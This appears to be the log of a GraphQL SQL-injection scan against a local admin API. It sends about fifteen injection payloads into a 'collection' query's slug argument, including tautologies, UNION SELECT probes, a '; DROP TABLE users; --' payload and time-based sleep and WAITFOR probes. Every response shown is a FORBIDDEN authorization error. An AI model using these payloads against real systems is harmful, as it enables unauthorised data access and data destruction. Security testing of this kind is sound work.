[+] Introspecting http://localhost:3000/admin-api

[>] Testing collection (string args: ['slug'])


	Payload:  '
	Query: query { collection(slug: " '") { isPrivate inheritFilters } }
	Response: {"errors":[{"message":"You are not currently authorized to perform this action","locations":[{"line":1,"column":9}],"path":["collection"],"extensions":{"code":"FORBIDDEN"}}],"data":{"collection":null}}



	Payload: ' OR '1'='1
	Query: query { collection(slug: "' OR '1'='1") { isPrivate inheritFilters } }
	Response: {"errors":[{"message":"You are not currently authorized to perform this action","locations":[{"line":1,"column":9}],"path":["collection"],"extensions":{"code":"FORBIDDEN"}}],"data":{"collection":null}}



	Payload: ' OR 1=1--
	Query: query { collection(slug: "' OR 1=1--") { isPrivate inheritFilters } }
	Response: {"errors":[{"message":"You are not currently authorized to perform this action","locations":[{"line":1,"column":9}],"path":["collection"],"extensions":{"code":"FORBIDDEN"}}],"data":{"collection":null}}



	Payload: ' OR 'a'='a
	Query: query { collection(slug: "' OR 'a'='a") { isPrivate inheritFilters } }
	Response: {"errors":[{"message":"You are not currently authorized to perform this action","locations":[{"line":1,"column":9}],"path":["collection"],"extensions":{"code":"FORBIDDEN"}}],"data":{"collection":null}}



	Payload: ' UNION SELECT NULL--
	Query: query { collection(slug: "' UNION SELECT NULL--") { isPrivate inheritFilters } }
	Response: {"errors":[{"message":"You are not currently authorized to perform this action","locations":[{"line":1,"column":9}],"path":["collection"],"extensions":{"code":"FORBIDDEN"}}],"data":{"collection":null}}



	Payload: '; DROP TABLE users; --
	Query: query { collection(slug: "'; DROP TABLE users; --") { isPrivate inheritFilters } }
	Response: {"errors":[{"message":"You are not currently authorized to perform this action","locations":[{"line":1,"column":9}],"path":["collection"],"extensions":{"code":"FORBIDDEN"}}],"data":{"collection":null}}



	Payload: ' AND 1=0 UNION SELECT NULL,NULL--
	Query: query { collection(slug: "' AND 1=0 UNION SELECT NULL,NULL--") { isPrivate inheritFilters } }
	Response: {"errors":[{"message":"You are not currently authorized to perform this action","locations":[{"line":1,"column":9}],"path":["collection"],"extensions":{"code":"FORBIDDEN"}}],"data":{"collection":null}}



	Payload: ') OR ('1'='1
	Query: query { collection(slug: "') OR ('1'='1") { isPrivate inheritFilters } }
	Response: {"errors":[{"message":"You are not currently authorized to perform this action","locations":[{"line":1,"column":9}],"path":["collection"],"extensions":{"code":"FORBIDDEN"}}],"data":{"collection":null}}



	Payload: admin' --
	Query: query { collection(slug: "admin' --") { isPrivate inheritFilters } }
	Response: {"errors":[{"message":"You are not currently authorized to perform this action","locations":[{"line":1,"column":9}],"path":["collection"],"extensions":{"code":"FORBIDDEN"}}],"data":{"collection":null}}



	Payload: ' OR sleep(5)--
	Query: query { collection(slug: "' OR sleep(5)--") { isPrivate inheritFilters } }
	Response: {"errors":[{"message":"You are not currently authorized to perform this action","locations":[{"line":1,"column":9}],"path":["collection"],"extensions":{"code":"FORBIDDEN"}}],"data":{"collection":null}}



	Payload: ' AND sleep(5)--
	Query: query { collection(slug: "' AND sleep(5)--") { isPrivate inheritFilters } }
	Response: {"errors":[{"message":"You are not currently authorized to perform this action","locations":[{"line":1,"column":9}],"path":["collection"],"extensions":{"code":"FORBIDDEN"}}],"data":{"collection":null}}



	Payload: ' WAITFOR DELAY '0:0:5'--
	Query: query { collection(slug: "' WAITFOR DELAY '0:0:5'--") { isPrivate inheritFilters } }
	Response: {"errors":[{"message":"You are not currently authorized to perform this action","locations":[{"line":1,"column":9}],"path":["collection"],"extensions":{"code":"FORBIDDEN"}}],"data":{"collection":null}}



	Payload: ' OR 'x'='x' /*
	Query: query { collection(slug: "' OR 'x'='x' /*") { isPrivate inheritFilters } }
	Response: {"errors":[{"message":"You are not currently authorized to perform this action","locations":[{"line":1,"column":9}],"path":["collection"],"extensions":{"code":"FORBIDDEN"}}],"data":{"collection":null}}



	Payload: ' OR EXISTS(SELECT * FROM users)--
	Query: query { collection(slug: "' OR EXISTS(SELECT * FROM users)--") { isPrivate inheritFilters } }
	Response: {"errors":[{"message":"You are not currently authorized to perform this action","locations":[{"line":1,"column":9}],"path":["collection"],"extensions":{"code":"FORBIDDEN"}}],"data":{"collection":null}}



	Payload: ' AND 1=(SELECT COUNT(*) FROM tablename)--
	Query: query { collection(slug: "' AND 1=(SELECT COUNT(*) FROM tablename)--") { isPrivate inheritFilters } }
	Response: {"errors":[{"message":"You are not currently authorized to perform this action","locations":[{"line":1,"column":9}],"path":["collection"],"extensions":{"code":"FORBIDDEN"}}],"data":{"collection":null}}


[>] Testing jobBufferSize (string args: ['bufferIds'])

[>] Testing productOptionGroups (string args: ['filterTerm'])

[>] Testing product (string args: ['slug'])
